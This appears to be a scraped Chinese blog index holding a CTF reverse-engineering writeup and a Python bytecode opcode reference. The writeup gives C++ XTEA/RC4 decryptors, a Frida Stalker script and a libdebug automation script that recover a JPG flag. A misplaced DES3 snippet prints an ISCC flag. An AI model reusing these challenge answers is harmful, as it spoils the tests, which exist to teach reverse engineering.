0x5 == 0x200x1b02a948 / 0x20 == 0xd8154a ;&gt;&gt; 50x2c9c83e8 * 0x8e2a4ab9 == 0xcf4c62a80x32154ef1 * 0x367d350a == 0xbfd9fa6a0xf4af1c08 | 0x19860d10 == 0xfdaf1d180x3e976f8f + 0x647f8454 == 0xa316f3e30xe009d4eb + 0x9c80e391 == 0x7c8ab87c0xe6751635 + 0x25da6ba == 0xe8d2bcef0x7753f9d2 * 0x41aeaeea == 0x454b15f40xc9e86bbd ^ 0x8b228ee8 == 0x42cae5550xa855f008 &amp; 0xc4e22ab0 == 0x804020000x80402000 | 0x42cae555 == 0xc2cae5550xc2cae555 * 0xe8d2bcef == 0x390865b0x390865b + 0xa316f3e3 == 0xa6a77a3e~0xa6a77a3e == 0x595885c10x2c9c83e8 * 0x8e2a4ab9 == 0xcf4c62a80x32154ef1 * 0x367d350a == 0xbfd9fa6a0xf4af1c08 | 0x19860d10 == 0xfdaf1d180x3e976f8f + 0x647f8454 == 0xa316f3e30xe009d4eb + 0x9c80e391 == 0x7c8ab87c0xe6751635 + 0x25da6ba == 0xe8d2bcef0x7753f9d2 * 0x41aeaeea == 0x454b15f40xc9e86bbd ^ 0x8b228ee8 == 0x42cae5550xa855f008 &amp; 0xc4e22ab0 == 0x804020000x80402000 | 0x42cae555 == 0xc2cae5550xc2cae555 * 0xe8d2bcef == 0x390865b0x390865b + 0xa316f3e3 == 0xa6a77a3e~0xa6a77a3e == 0x595885c10x595885c1 / 0x7 == 0xcc380d20xcc380d2 * 0x7 == 0x595885be0x2 ** 0x4 == 0x10 ;bufl &lt;&lt;40x1b02a948 * 0x10 == 0xb02a9480~0xd8154a == 0xff27eab50xff27eab5 &amp; 0xb02a9480 == 0xb0228080~0xb02a9480 == 0x4fd56b7f0x4fd56b7f &amp; 0xd8154a == 0xd0014a0xd0014a | 0xb0228080 == 0xb0f281ca0x0 += 0xc3c67cdc == 0xc3c67cdc  ; sum+=delta0xb0f281ca + 0x1b02a948 == 0xcbf52b120xc3c67cdc / 0x800 == 0x1878cf  ;&gt;&gt;110xff &amp; 0x1878cf == 0xcf*(0x7fffffffcd50 + (0xcf &lt;&lt; 2)) == 0xbb0xbb + 0xc3c67cdc == 0xc3c67d97   sbox[] + sum0xcbf52b12 ^ 0xc3c67d97 == 0x83356850x68676665 += 0x8335685 == 0x709abcea\n\n上面的步骤把加密过程复杂化了。\n比如把异或运算进行了展开：a ^ b &#x3D;&#x3D; (~a &amp; b) | (a &amp; ~b)；\n把左右位移替换成了对2的n次方的乘法和除法。\n第一个文件的加密方式：xtea  + rc4 的流密钥\n#include &lt;iostream&gt;#include &lt;cstdint&gt;#include &lt;vector&gt;using namespace std;vector&lt;uint8_t&gt; sbox = &#123;0xAE, 0x6F, 0xD5, 0xC9, 0xA0, 0x44, 0xB1, 0x95, 0x87, 0x21, 0x65, 0x8B, 0x74, 0x39, 0xA6, 0x84, 0x71, 0x31, 0x5E, 0x93, 0x77, 0xE0, 0xD0, 0x82, 0xBE, 0x3E, 0x1F, 0xC8, 0xC1, 0x67, 0x5C, 0xF9, 0xF6, 0x90, 0x89, 0x2A, 0xB6, 0xE1, 0xDE, 0x83, 0x88, 0x19, 0x3C, 0xC2, 0xE7, 0x1A, 0x4, 0x29, 0x4F, 0x27, 0x2F, 0xCB, 0x5D, 0x7F, 0xBA, 0x64, 0x49, 0x43, 0x30, 0x12, 0x41, 0xDB, 0x33, 0x10, 0x55, 0x3B, 0x35, 0x53, 0x40, 0x3D, 0xFF, 0x2, 0x9C, 0x51, 0x97, 0x5B, 0x22, 0x15, 0xB, 0x58, 0x4D, 0xB3, 0xEA, 0xC, 0x5A, 0xBF, 0xEE, 0xC6, 0xDF, 0xB7, 0x52, 0x60, 0xF8, 0xDC, 0x69, 0x1E, 0x6E, 0x14, 0x91, 0xA3, 0x98, 0x7C, 0xFC, 0x8, 0xCC, 0x7A, 0x46, 0x50, 0xC3, 0xB0, 0x68, 0x76, 0x9E, 0xCE, 0x62, 0x4A, 0xE4, 0x61, 0x2D, 0xE2, 0xD1, 0x4E, 0x85, 0x1B, 0x16, 0x6B, 0x79, 0x9, 0x94, 0x8F, 0xE8, 0x47, 0x7E, 0x81, 0x9D, 0x17, 0x80, 0x11, 0xC5, 0xD8, 0xF, 0x24, 0x96, 0xB2, 0x7, 0xED, 0xCA, 0xEC, 0x25, 0xA2, 0x3, 0xB5, 0x4C, 0xCF, 0x4B, 0xAA, 0xD4, 0xA8, 0xF2, 0x56, 0x9B, 0xAF, 0x57, 0x6C, 0xB8, 0x66, 0xF0, 0x7D, 0xAB, 0xD7, 0x34, 0xBC, 0x32, 0x59, 0x78, 0xD6, 0xC4, 0x1D, 0x99, 0xC0, 0x1, 0xEF, 0x92, 0x75, 0x2C, 0x63, 0x8A, 0xE, 0x38, 0x8D, 0x18, 0x6A, 0xE5, 0x2E, 0x26, 0x8E, 0x3F, 0xA1, 0xA5, 0x20, 0xF4, 0xFE, 0x1C, 0x42, 0xCD, 0xD2, 0x28, 0xBB, 0xD9, 0xA4, 0xEB, 0x9A, 0xC7, 0xA, 0xA9, 0x37, 0x8C, 0x5, 0xF3, 0x2B, 0x45, 0xDD, 0xFB, 0xAD, 0x6, 0xA7, 0x54, 0xD, 0x23, 0xB4, 0xF7, 0x0, 0x9F, 0x36, 0x70, 0xFA, 0x86, 0xE9, 0x6D, 0xF5, 0xDA, 0xD3, 0x72, 0xE6, 0xFD, 0x48, 0xE3, 0xBD, 0x73, 0xAC, 0x3A, 0x13, 0x7B, 0xB9, 0xF1, 0x5F&#125;;void decrypt (uint32_t *v,uint32_t allRoundSum)&#123;    uint32_t v0=v[0],v1=v[1],sum=allRoundSum,i=0;    uint32_t delta=0xc3c67cdc;     do&#123;        v1-=((v0 &lt;&lt; 4)^(v0 &gt;&gt; 5) + v0) ^( sbox[(sum &gt;&gt;11)&amp;0xff]+ sum);        sum-=delta;        v0-=((v1 &lt;&lt; 3)^(v1 &gt;&gt; 3) + v1) ^( sbox[(sum &amp;0x3)&amp;0xff]+ sum);            i++;    &#125; while(0x478 &gt;= i);    v[0]=v0;v[1]=v1;&#125;uint32_t encrypt (uint32_t *v)&#123;    uint32_t v0=v[0],v1=v[1],sum=0,i=0;    uint32_t delta=0xc3c67cdc;     do&#123;        v0+=((v1 &lt;&lt; 3)^(v1 &gt;&gt; 3) + v1) ^( sbox[(sum &amp;0x3 )&amp;0xff]+ sum);        sum+=delta;        v1+=((v0 &lt;&lt; 4)^(v0 &gt;&gt; 5) + v0) ^( sbox[(sum &gt;&gt;11)&amp;0xff] + sum);        i++;    &#125; while(0x478 &gt;= i);    v[0]=v0;v[1]=v1;    return sum;&#125;int main()&#123;    uint32_t v[2]=&#123;0x64636261,0x68676665&#125;; //test    uint32_t enc[2]=&#123;0x3d2c5b74,0xf06203ec&#125;;     uint32_t sum = encrypt(v);        cout&lt;&lt;hex&lt;&lt;v[0]&lt;&lt;&quot; &quot;&lt;&lt;v[1]&lt;&lt;endl;    decrypt(enc,sum);    cout&lt;&lt;hex&lt;&lt;enc[0]&lt;&lt;&quot; &quot;&lt;&lt;enc[1]&lt;&lt;endl;    return 0;&#125;//e2ffd8ff 4349580c//ff d8 ff e2 0c 58 49 43\n\n解出jpg的文件头ff d8 ff e2 0c 58 49 43\n又看了一遍第2个文件\n#include &lt;iostream&gt;#include &lt;cstdint&gt;#include &lt;vector&gt;using namespace std;vector&lt;uint8_t&gt; sbox = &#123;0x2A, 0x6D, 0xC8, 0xB9, 0xAF, 0xC5, 0x6F, 0x66, 0x6, 0x88, 0x46, 0x31, 0xA0, 0x3D, 0x17, 0x93, 0xE0, 0x3E, 0xF3, 0x60, 0x24, 0x22, 0xEA, 0x14, 0x23, 0x18, 0x57, 0xA8, 0xD7, 0x27, 0xD8, 0xD1, 0xE, 0x3F, 0x20, 0x90, 0x4C, 0xDD, 0x1C, 0x4D, 0x8B, 0x4E, 0x36, 0x41, 0x39, 0x73, 0xB2, 0x9C, 0xB6, 0xE8, 0xC2, 0x34, 0x2B, 0xC, 0x92, 0x1F, 0x8F, 0x7A, 0xFE, 0x83, 0x94, 0x40, 0xD2, 0x79, 0x75, 0x35, 0x9F, 0x3A, 0xD6, 0x84, 0x7B, 0x16, 0x5C, 0xAC, 0x5E, 0xB5, 0x1, 0x37, 0x63, 0xD5, 0xAE, 0x9A, 0x1B, 0xD4, 0x81, 0x21, 0x7D, 0xF1, 0x69, 0xA9, 0x55, 0xBE, 0x42, 0x5A, 0x8A, 0x89, 0xE7, 0xA4, 0x71, 0xB8, 0x45, 0xF5, 0xAA, 0xD0, 0xA5, 0x74, 0xCC, 0xE1, 0xAD, 0x33, 0xEE, 0x28, 0xF, 0xBA, 0x78, 0x2D, 0x50, 0x25, 0xEF, 0xC3, 0xA6, 0x9, 0x49, 0x87, 0xD, 0x91, 0xFB, 0x59, 0x4B, 0xB7, 0x3, 0x8, 0xC0, 0xB1, 0xEB, 0x77, 0xFD, 0x48, 0xBD, 0x43, 0x9B, 0xB0, 0xF7, 0x5D, 0xF2, 0xE3, 0x2F, 0xDB, 0xE5, 0xB, 0x86, 0x13, 0x2C, 0x51, 0x5F, 0x97, 0x6C, 0x4, 0x7E, 0x64, 0x70, 0xCD, 0x72, 0xFA, 0xFC, 0xA2, 0x26, 0x7, 0xEC, 0x98, 0x8C, 0xCB, 0xA7, 0x96, 0x5, 0xD9, 0xF4, 0x2, 0x8D, 0xC1, 0x82, 0xF8, 0x47, 0x9E, 0xBC, 0x99, 0xC6, 0x11, 0xB4, 0x3C, 0xCE, 0x3B, 0xFF, 0x6A, 0xDF, 0x30, 0x76, 0x5B, 0x4A, 0x29, 0xC4, 0x2E, 0xDA, 0x7C, 0xED, 0xE9, 0x61, 0x12, 0x4F, 0x53, 0x9D, 0x62, 0x80, 0xCF, 0x8E, 0x32, 0xCA, 0x95, 0x56, 0x67, 0xC7, 0x58, 0xF0, 0x1A, 0x85, 0xA3, 0xDC, 0xB3, 0xA, 0xA1, 0x0, 0xE6, 0x52, 0x54, 0xF6, 0xAB, 0x15, 0xF9, 0x1D, 0xE4, 0x38, 0x7F, 0x6E, 0x6B, 0xBF, 0x1E, 0xDE, 0xC9, 0xBB, 0x44, 0x19, 0x10, 0xE2, 0xD3, 0x68, 0x65&#125;;void decrypt (uint32_t *v,uint32_t allRoundSum)&#123;    uint32_t v0=v[0],v1=v[1],sum=allRoundSum,i=0;    uint32_t delta=0x9d175c01;     do&#123;        v1-=((v0 &lt;&lt; 2)^(v0 &gt;&gt; 3) + v0) ^( sbox[(sum &gt;&gt;11)&amp;0xff]+ sum);        sum-=delta;        v0-=((v1 &lt;&lt; 4)^(v1 &gt;&gt; 1) + v1) ^( sbox[(sum &amp;0x3)&amp;0xff]+ sum);            i++;    &#125; while(0x478 &gt;= i);    v[0]=v0;v[1]=v1;&#125;uint32_t encrypt (uint32_t *v)&#123;    uint32_t v0=v[0],v1=v[1],sum=0,i=0;    uint32_t delta=0x9d175c01;     do&#123;        v0+=((v1 &lt;&lt; 4)^(v1 &gt;&gt; 1) + v1) ^( sbox[(sum &amp;0x3 )&amp;0xff]+ sum);        sum+=delta;        v1+=((v0 &lt;&lt; 2)^(v0 &gt;&gt; 3) + v0) ^( sbox[(sum &gt;&gt;11)&amp;0xff] + sum);        i++;    &#125; while(0x478 &gt;= i);    v[0]=v0;v[1]=v1;    return sum;&#125;int main()&#123;    uint32_t v[2]=&#123;0x64636261,0x68676665&#125;; //test    uint32_t enc[2]=&#123;0x5c97bcbf,0x11bc6542&#125;;     uint32_t sum = encrypt(v);    cout&lt;&lt;hex&lt;&lt;v[0]&lt;&lt;&quot; &quot;&lt;&lt;v[1]&lt;&lt;endl;    decrypt(enc,sum);    cout&lt;&lt;hex&lt;&lt;enc[0]&lt;&lt;&quot; &quot;&lt;&lt;enc[1]&lt;&lt;endl;    return 0;&#125;//43 5f 50 52 4f 46 49 4c\n\n发现修改的地方有”&lt;&lt;”和”&gt;&gt;”的位移数，delta值，RC4流密钥，密文。\n在加密函数中可以发现在函数调用之前的字节码是有特征的，我们可以在内存中搜索这段字节码从而定位操作的位置，下断点，然后运行读取寄存器中的传入的参数。\n尝试过用frida，但是后面发现libdebug更加容易，这里是一个frida的测试脚本，只对文件1，2，3进行了测试。\n//const FUNC_OFFSET = 0x1630  // 1const FUNC_OFFSET = 0x17C0;   // 2//const FUNC_OFFSET = 0x0167B  //3const pow = [0x89, 0xc6, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xe8] //eaxvar powFlag = 0; //4var shift = []; //4 r&gt;&gt;  r&lt;&lt;  l&gt;&gt;  l&lt;&lt;const delta = [0x48, 0x89, 0xc7, 0xff, 0xd1]; //esivar deltaFlag = 0; //1var deltaData = 0;const sbox = [0x89, 0xce, 0x48, 0x89, 0xc7, 0x41, 0xff, 0xd0]; //rax:addr 256*4 bytesvar sboxFlag = 0;var sboxData = [];//ptrfunction matchPattern(code,pattern) &#123;    for (let i = 0; i &lt; pattern.length; i++) &#123;        if (code[i] !== pattern[i]) return false;    &#125;    return true;&#125;const moduleBase = Process.getModuleByName(&quot;beatme&quot;).base;const targetAddr = moduleBase.add(FUNC_OFFSET);console.log(&quot;[*] Waiting to reach function at&quot;, targetAddr);Interceptor.attach(targetAddr, &#123;    onEnter(args) &#123;        try &#123;            console.log(&quot;[+] Entered target function, starting Stalker at&quot;, targetAddr);            console.log(ptr(args[1]))            Stalker.follow(Process.getCurrentThreadId(), &#123;                transform(iterator) &#123;                    let instruction;                    while ((instruction = iterator.next()) !== null) &#123;                        const addr = instruction.address;                        const codeBytes = Memory.readByteArray(addr, 8);                        const code = new Uint8Array(codeBytes);                        // console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                        if ((powFlag &lt; 4) &amp;&amp; matchPattern(code,pow)) &#123;                            console.log(&quot;[*] Match pow found at:&quot;, addr.sub(moduleBase));                            console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                            iterator.putCallout(function (context) &#123;                                if(powFlag &gt;=4) return;                                var rax = context.rax;                                console.log(`shift: EAX = $&#123;rax.toString(16)&#125;`);                                shift[powFlag++] = rax;                            &#125;)                        &#125;                        else if (!deltaFlag &amp;&amp; matchPattern(code,delta)) &#123;                            console.log(&quot;[*] Match delta found at:&quot;, addr.sub(moduleBase));                            console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                            iterator.putCallout(function (context) &#123;                                if(deltaFlag != 0) return;                                var rsi = context.rsi;                                console.log(`delta: RSI = $&#123;rsi.toString(16)&#125;`);                                deltaData = rsi;                                deltaFlag++;                            &#125;)                        &#125;                        else if (!sboxFlag &amp;&amp; matchPattern(code,sbox)) &#123;                                                        console.log(&quot;[*] Match sbox found at:&quot;, addr.sub(moduleBase));                            console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                            iterator.putCallout(function (context) &#123;                                if(sboxFlag != 0)return;                                var rax = context.rax;                                console.log(`sbox: RAX = $&#123;rax.toString(16)&#125;`);                                for (let i = 0; i &lt; 256; i++) &#123;                                    const value = Memory.readU32(rax.add(i * 4));                                    sboxData.push(value);                                    sboxFlag++;                                &#125;                            &#125;)                        &#125;                        iterator.keep();                    &#125;                &#125;            &#125;);        &#125; catch (e) &#123;            console.log(e);        &#125;    &#125;,    onLeave: function (args) &#123;    console.log(sboxData)console.log(shift);console.log(deltaData);    &#125;&#125;);\n\n\n用libdebug进行自动调试，获取数据并解密，在game文件夹下运行。注意！因为一些原因一次性跑完全部文件会在4000多个的时候报错资源耗尽。所以把解密分成了四段，手动修改并运行四次脚本。大概在运行两段后其实就已经可以得到flag。\nfrom libdebug import debuggerfrom libdebug import libcontextfrom ctypes import * import osfrom struct import packfrom tqdm import tqdmdef decrypt(v, key,delta,shift):    v0, v1  = c_uint32(v[0]), c_uint32(v[1])        total = c_uint32(delta * 0x479)    for i in range(1145):        v1.value -= (((v0.value &lt;&lt; shift[3]) ^ (v0.value &gt;&gt; shift[2])) + v0.value) ^ (total.value + key[(total.value&gt;&gt;11) &amp; 0xff])        total.value -= delta         v0.value -= (((v1.value &lt;&lt; shift[0]) ^ (v1.value &gt;&gt; shift[1])) + v1.value) ^ (total.value + key[total.value &amp; 3])    return v0.value, v1.value def one(i):    old_cwd = os.getcwd()    path = f&quot;./&#123;i&#125;&quot;    os.chdir(path)    d = debugger(&quot;./beatme&quot;,auto_interrupt_on_command=True)    try:        p = d.run()         sl   = lambda d:                      p.sendline(d)        b    = lambda *a, **kw:               d.breakpoint(*a, **kw)        c    = lambda:                        d.cont()        wait = lambda:                        d.wait()        find = lambda *a, **kw:               d.memory.find(*a, **kw)        db   = lambda addr:                   d.breakpoints[addr].disable()        pow_pattern = [0x89, 0xc6, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xe8] #eax  4 r&gt;&gt;  r&lt;&lt;  l&gt;&gt;  l&lt;&lt;        shift = []        delta_pattern = [0x48,0x89,0xc7,0xff,0xd1,0x4c,0x8b,0x05] #esi        delta = None        sbox_pattern = [0x89, 0xce, 0x48, 0x89, 0xc7, 0x41, 0xff, 0xd0] #rax:addr 256*4 bytes        sbox =[]        enc_pattern1 = [[0x8b,0x45,0xa8,0x3d],[0x8b,0x45,0xac,0x3d]]         encData=[]        sl(b&quot;abcdefgh&quot;)        addr_enc =[]        for i in range(2):            addr_enc.append(find(bytes(enc_pattern1[i]),file=&quot;beatme&quot;))        addr_pow = find(bytes(pow_pattern),file=&quot;beatme&quot;)        addr_delta = find(bytes(delta_pattern),file=&quot;beatme&quot;)        addr_sbox = find(bytes(sbox_pattern),file=&quot;beatme&quot;)        b_pow =[]        for i in range(4):            b_pow.append(b(addr_pow[i],file=&quot;beatme&quot;))        for i in range(4):            c()            wait()            eax = d.regs.eax            shift.append(eax)            rip = d.regs.rip            db(rip)        b_delta = b(addr_delta[0],file=&quot;beatme&quot;)        c()        wait()        delta = d.regs.esi        db(d.regs.rip)        b_sbox = b(addr_sbox[0],file=&quot;beatme&quot;)        c()        wait()        rax = d.regs.rax        sbox = d.memory[rax,256*4]        db(d.regs.rip)        b_enc =[]        for i in range(2):            a = d.memory[addr_enc[i][0] + 4, 4]            encData.append(int.from_bytes(a,&quot;little&quot;))        key =[]        for i in range(0,len(sbox),4):            key.append(int.from_bytes(sbox[i:i+4:],&quot;little&quot;))        a,b=decrypt(encData,key,delta,shift)        if d.dead:            print(f&quot;The process exited with signal &#123;d.exit_signal&#125;&quot;)            print(f&quot;The process exited with code &#123;d.exit_code&#125;&quot;)        os.chdir(old_cwd)        d.kill()        return a,b    except Exception as e:        os.chdir(old_cwd)        print(f&quot;[!] 第 &#123;i&#125; 个样本失败: &#123;e&#125;&quot;)        d.kill()        return Noneresult_bytes = bytearray()#[(1, 2856), (2857, 5712), (5713, 8568), (8569, 11423)]for i in tqdm(range(1, 2856), desc=&quot;process&quot;):        res = one(i)        if res is None:            break        a, b = res        result_bytes += pack(&quot;&lt;I&quot;, a)        result_bytes += pack(&quot;&lt;I&quot;, b)with open(&quot;output.jpg&quot;, &quot;ab&quot;) as f:    f.write(result_bytes)\n\n\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"python常用机器码助记符总结","url":"/2025/01/07/py%E5%AD%97%E8%8A%82%E7%A0%81/","content":"由于内容太多一下信息由AI辅助整理。\n模块操作\nIMPORT_NAME: 导入模块或名称。\nIMPORT_FROM: 从模块中加载特定的名称。\nIMPORT_STAR: 从模块中导入所有名称。\n\n加载和存储操作\nLOAD_CONST(consti): 将常量 co_consts[consti] 推入栈顶。\nLOAD_NAME(namei): 将名称 co_names[namei] 对应的值推入栈顶。\nLOAD_FAST(var_num): 将局部变量 co_varnames[var_num] 推入栈顶。\nSTORE_NAME(namei): 将栈顶的值存储到名称 co_names[namei]。\nSTORE_FAST(var_num): 将栈顶的值存储到局部变量 co_varnames[var_num]。\n\n算术操作1. 数学运算这些操作码用于执行基本的数学运算，操作数从栈顶弹出，结果推入栈顶。\n\nBINARY_ADD:弹出栈顶两个元素，执行加法运算（TOS = TOS1 + TOS），结果推入栈顶。示例：a + b\n\nBINARY_SUBTRACT:弹出栈顶两个元素，执行减法运算（TOS = TOS1 - TOS），结果推入栈顶。示例：a - b\n\nBINARY_MULTIPLY:弹出栈顶两个元素，执行乘法运算（TOS = TOS1 * TOS），结果推入栈顶。示例：a * b\n\nBINARY_TRUE_DIVIDE:弹出栈顶两个元素，执行真除法运算（TOS = TOS1 / TOS），结果推入栈顶。示例：a / b\n\nBINARY_FLOOR_DIVIDE:弹出栈顶两个元素，执行地板除法运算（TOS = TOS1 // TOS），结果推入栈顶。示例：a // b\n\nBINARY_MODULO:弹出栈顶两个元素，执行取模运算（TOS = TOS1 % TOS），结果推入栈顶。示例：a % b\n\nBINARY_POWER:弹出栈顶两个元素，执行幂运算（TOS = TOS1 ** TOS），结果推入栈顶。示例：a ** b\n\n\n\n2. 位运算这些操作码用于执行位级别的操作。\n\nBINARY_LSHIFT:弹出栈顶两个元素，执行左移运算（TOS = TOS1 &lt;&lt; TOS），结果推入栈顶。示例：a &lt;&lt; b\n\nBINARY_RSHIFT:弹出栈顶两个元素，执行右移运算（TOS = TOS1 &gt;&gt; TOS），结果推入栈顶。示例：a &gt;&gt; b\n\nBINARY_AND:弹出栈顶两个元素，执行按位与运算（TOS = TOS1 &amp; TOS），结果推入栈顶。示例：a &amp; b\n\nBINARY_OR:弹出栈顶两个元素，执行按位或运算（TOS = TOS1 | TOS），结果推入栈顶。示例：a | b\n\nBINARY_XOR:弹出栈顶两个元素，执行按位异或运算（TOS = TOS1 ^ TOS），结果推入栈顶。示例：a ^ b\n\n\n\n3. 一元运算这些操作码用于对栈顶的单个元素进行操作。\n\nUNARY_POSITIVE:对栈顶元素执行正号运算（TOS = +TOS），结果推入栈顶。示例：+a\n\nUNARY_NEGATIVE:对栈顶元素执行负号运算（TOS = -TOS），结果推入栈顶。示例：-a\n\nUNARY_NOT:对栈顶元素执行逻辑非运算（TOS = not TOS），结果推入栈顶。示例：not a\n\nUNARY_INVERT:对栈顶元素执行按位取反运算（TOS = ~TOS），结果推入栈顶。示例：~a\n\n\n\n4. 增量运算这些操作码用于就地修改值（in-place operations）。\n\nINPLACE_ADD:弹出栈顶两个元素，执行就地加法运算（TOS = TOS1 + TOS），结果推入栈顶。示例：a += b\n\nINPLACE_SUBTRACT:弹出栈顶两个元素，执行就地减法运算（TOS = TOS1 - TOS），结果推入栈顶。示例：a -= b\n\nINPLACE_MULTIPLY:弹出栈顶两个元素，执行就地乘法运算（TOS = TOS1 * TOS），结果推入栈顶。示例：a *= b\n\nINPLACE_TRUE_DIVIDE:弹出栈顶两个元素，执行就地真除法运算（TOS = TOS1 / TOS），结果推入栈顶。示例：a /= b\n\nINPLACE_FLOOR_DIVIDE:弹出栈顶两个元素，执行就地地板除法运算（TOS = TOS1 // TOS），结果推入栈顶。示例：a //= b\n\nINPLACE_MODULO:弹出栈顶两个元素，执行就地取模运算（TOS = TOS1 % TOS），结果推入栈顶。示例：a %= b\n\nINPLACE_POWER:弹出栈顶两个元素，执行就地幂运算（TOS = TOS1 ** TOS），结果推入栈顶。示例：a **= b\n\nINPLACE_LSHIFT:弹出栈顶两个元素，执行就地左移运算（TOS = TOS1 &lt;&lt; TOS），结果推入栈顶。示例：a &lt;&lt;= b\n\nINPLACE_RSHIFT:弹出栈顶两个元素，执行就地右移运算（TOS = TOS1 &gt;&gt; TOS），结果推入栈顶。示例：a &gt;&gt;= b\n\nINPLACE_AND:弹出栈顶两个元素，执行就地按位与运算（TOS = TOS1 &amp; TOS），结果推入栈顶。示例：a &amp;= b\n\nINPLACE_OR:弹出栈顶两个元素，执行就地按位或运算（TOS = TOS1 | TOS），结果推入栈顶。示例：a |= b\n\nINPLACE_XOR:弹出栈顶两个元素，执行就地按位异或运算（TOS = TOS1 ^ TOS），结果推入栈顶。示例：a ^= b\n\n\n\n5. 比较运算\nCOMPARE_OP(opname):弹出栈顶两个元素，根据 opname 进行比较（如 &lt;, &gt;, ==, != 等），将结果（True&#x2F;False）推入栈顶。示例：a &lt; b\nIS_OP&#96;: 判断栈顶两个对象是否是同一个对象（is 操作）。\nIS_NOT&#96;: 判断栈顶两个对象是否不是同一个对象（is not 操作）。\n\n控制流1. 条件判断操作码这些操作码用于实现条件分支，如if语句。\n\nPOP_JUMP_IF_FALSE(target):\n作用：如果栈顶的值为False，则跳转到target指定的字节码位置；否则继续执行。\n示例：用于if语句的条件判断。\n\n\nPOP_JUMP_IF_TRUE(target):\n作用：如果栈顶的值为True，则跳转到target指定的字节码位置；否则继续执行。\n示例：用于if语句的条件判断。\n\n\nJUMP_IF_FALSE_OR_POP(target):\n作用：如果栈顶的值为False，则跳转到target；否则弹出栈顶的值并继续执行。\n示例：用于短路逻辑（如and操作）。\n\n\nJUMP_IF_TRUE_OR_POP(target):\n作用：如果栈顶的值为True，则跳转到target；否则弹出栈顶的值并继续执行。\n示例：用于短路逻辑（如or操作）。\n\n\n\n\n2. 循环控制操作码x from Crypto.Cipher import DES3from Crypto.Util.Padding import unpad​key &#x3D; b”74KLVll8hUBIt3joOiKfYLCj” ​ciphertext &#x3D; “”.join(chr(i) for i in [69, 49, 52, 68, 53, 53, 53, 66, 50, 65, 57, 55, 56, 50, 52, 53])ciphertext &#x3D; bytes.fromhex(ciphertext)cipher &#x3D; DES3.new(key, DES3.MODE_ECB)​flag &#x3D;””try:    plaintext &#x3D; unpad(cipher.decrypt(ciphertext), DES3.block_size)    flag &#x3D; plaintext.decode()except ValueError as e:    print(e)​ciphertext2 &#x3D; bytes.fromhex(“298B602DA18468FC”)ciphertext2 &#x3D; ciphertext2[::-1]​key2 &#x3D; b”9uzGw2TJszopH0NAecGL0sUS”​cipher2 &#x3D; DES3.new(key2, DES3.MODE_ECB)plaintext2 &#x3D; cipher2.decrypt(ciphertext2)flag +&#x3D; plaintext2.decode()​print(“ISCC{“ + flag +”}”)# ISCC{Zccr1lzQTGEr0d}python\n\nSETUP_LOOP(delta):\n\n作用：设置一个循环块，delta是循环结束后的跳转目标。\n示例：用于for循环或while循环的开始。\n\n\nPOP_BLOCK:\n\n作用：退出当前循环块，恢复循环之前的栈状态。\n示例：用于循环结束或break语句。\n\n\nBREAK_LOOP:\n\n作用：立即退出当前循环。\n示例：用于break语句。\n\n\nCONTINUE_LOOP(target):\n\n作用：跳转到循环的开始位置，继续下一次迭代。\n示例：用于continue语句。\n\n循环可能会涉及到迭代器如列表之类的，这时候会用到容器操作。\n\n\n\n3. 跳转操作码这些操作码用于实现无条件跳转。\n\nJUMP_ABSOLUTE(target):\n作用：无条件跳转到指定的字节码位置。\n示例：用于循环的重新开始或跳转。\n\n\nJUMP_FORWARD(delta):\n作用：向前跳转delta个字节码位置。\n示例：用于跳过代码块或循环的结束。\n\n\n\n\n4. 异常处理操作码这些操作码用于实现异常处理，如try-except语句。\n\nSETUP_FINALLY(delta):\n作用：设置一个finally块，delta是finally块的跳转目标。\n示例：用于try-finally语句。\n\n\nSETUP_EXCEPT(delta):\n作用：设置一个except块，delta是except块的跳转目标。\n示例：用于try-except语句。\n\n\nRAISE_VARARGS(argc):\n作用：抛出异常，argc指定异常参数的数量。\n示例：用于raise语句。\n\n\nWITH_CLEANUP_START:\n作用：开始清理with语句块的资源。\n示例：用于with语句。\n\n\nWITH_CLEANUP_FINISH:\n作用：结束清理with语句块的资源。\n示例：用于with语句。\n\n\n\n容器操作1. 列表相关操作码\nBUILD_LIST(count): 创建一个包含count个元素的新列表。元素从栈顶弹出，列表被推入栈顶。\nLIST_APPEND(i): 将栈顶的元素追加到列表中。i是列表在栈中的位置。\nLIST_EXTEND(i): 将栈顶的可迭代对象扩展到列表中。i是列表在栈中的位置。\nLIST_TO_TUPLE: 将栈顶的列表转换为元组，并将元组推入栈顶。\nLIST_SUBSCRIPT: 对列表进行下标操作，获取或设置列表中的元素。\n\n2. 元组相关操作码\nBUILD_TUPLE(count): 创建一个包含count个元素的新元组。元素从栈顶弹出，元组被推入栈顶。\nTUPLE_SUBSCRIPT: 对元组进行下标操作，获取元组中的元素。\n\n3. 字典相关操作码\nBUILD_MAP(count): 创建一个包含count个键值对的新字典。键值对从栈顶弹出，字典被推入栈顶。\nMAP_ADD(i): 将栈顶的键值对添加到字典中。i是字典在栈中的位置。\nDICT_UPDATE(i): 将栈顶的字典更新到目标字典中。i是目标字典在栈中的位置。\nDICT_MERGE(i): 将栈顶的字典合并到目标字典中。i是目标字典在栈中的位置。\n\n4. 集合相关操作码\nBUILD_SET(count): 创建一个包含count个元素的新集合。元素从栈顶弹出，集合被推入栈顶。\nSET_ADD(i): 将栈顶的元素添加到集合中。i是集合在栈中的位置。\nSET_UPDATE(i): 将栈顶的可迭代对象更新到集合中。i是集合在栈中的位置。\n\n5. 通用容器操作码\nCONTAINS_OP: 检查栈顶的元素是否包含在容器中。\nIS_OP: 检查栈顶的两个元素是否是同一个对象。\nGET_ITER: 将栈顶的容器转换为迭代器，并将迭代器推入栈顶。\nFOR_ITER(delta): 从迭代器中获取下一个元素，并将其推入栈顶。如果迭代器耗尽，则跳转到delta指定的位置。\nUNPACK_SEQUENCE(count): 将栈顶的序列解包为count个元素，并将这些元素推入栈顶。\n\n6. 其他相关操作码\nSTORE_SUBSCR: 对容器进行下标赋值操作，将栈顶的值赋给容器的指定下标。\nDELETE_SUBSCR: 删除容器中指定下标的元素。\nBINARY_SUBSCR: 对容器进行下标操作，获取容器中的元素。\n\n7.切片\nBUILD_SLICE \n\n功能：根据栈顶的元素构建一个切片对象。\n\n参数：\n\n如果操作码的参数是 2，则表示构建一个简单的切片（只有 start 和 stop，如 a[start:stop]）。\n如果操作码的参数是 